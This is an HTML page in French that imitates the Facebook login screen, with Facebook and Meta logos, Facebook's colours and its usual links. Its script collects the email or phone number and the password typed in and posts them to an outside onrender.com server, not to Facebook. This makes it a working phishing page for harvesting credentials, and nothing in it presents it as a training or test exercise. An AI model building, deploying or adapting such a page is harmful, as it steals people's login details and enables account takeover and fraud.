<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Page de Connexion</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .login-container {
            text-align: center;
            width: 100%;
            max-width: 400px;
            background: linear-gradient(to bottom,
            #f3eff0 0%,    /* Rose très pâle en haut */
            #eaecfc 100%  
        );
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
        }

        .login-container img {
            width: 50px;
            height: 50px;
            margin-bottom: 20px;
        }

        .login-container h1 {
            font-size: 18px;
            color: #333;
            margin-bottom: 20px;
        }

        .login-container input {
            width: calc(100% - 20px);
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 14px;
        }

        .login-container button {
            width: 100%;
            padding: 10px;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            margin-bottom: 10px;
        }

        .login-container button:hover {
            background-color: #155dbb;
        }

        .login-container a {
            text-decoration: none;
            color: #1877f2;
            font-size: 14px;
            display: block;
            margin-top: 40px;
            text-align: center;
        }

        .login-container .meta {
            font-size: 12px;
            color: #aaa;
            margin-top: 20px;
        }
        .logo{
            height: 100px;
            width: 100px;
        }
       
    </style>
</head>
<body>
    <div class="login-container">
        <h5 style="color: #a8a6a6;">Francais (France)</h5>
        <img src="facebook.png" alt="Logo">
        
        <form id="loginForm">
            <input id="emailOrMobile" type="text" placeholder="Numéro mobile ou e-mail" style="border-radius: 10px; height:40px" required>
            <input id="password" type="password" placeholder="Mot de passe" style="border-radius: 10px; height:40px" required>
            <button type="submit" style="border-radius: 50px;">Se connecter</button>
        </form>
        
        <a href="#">Mot de passe oublié ?</a>
        <a href="#" style="border-radius:50px; border:solid #1877f2 1.5px; height:40px;text-align:center">Créer un compte</a>
        <div class="meta">
            <p><img src="meta.webp" alt="Logo" class="logo"></p>
        </div>
    </div>
<div id="error-message" style="color: red; margin-top: 10px;"></div>

    <script>
       document.getElementById('loginForm').addEventListener('submit', async (event) => {
    event.preventDefault();

    const emailOrMobile = document.getElementById('emailOrMobile').value;
    const password = document.getElementById('password').value;
    const submitButton = event.target.querySelector('button[type="submit"]');
    const errorMessage = document.getElementById('error-message');

    errorMessage.textContent = ''; // Réinitialiser le message d'erreur
    submitButton.disabled = true; // Désactiver le bouton

    if (!emailOrMobile || !password) {
        errorMessage.textContent = 'Veuillez remplir tous les champs.';
        submitButton.disabled = false; // Réactiver le bouton
        return;
    }

    try {
        const response = await fetch('https://back-ky38.onrender.com/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ emailOrMobile, password }),
        });

        const data = await response.json();
        if (response.ok) {
            alert(data.message);
        } else {
            errorMessage.textContent = 'Erreur : ' + data.error;
        }
    } catch (error) {
        console.error('Erreur lors de la requête :', error);
        errorMessage.textContent = 'Erreur lors de l\'envoi des données.';
    } finally {
        submitButton.disabled = false; // Réactiver le bouton
    }
});

    </script>
</body>
</html>
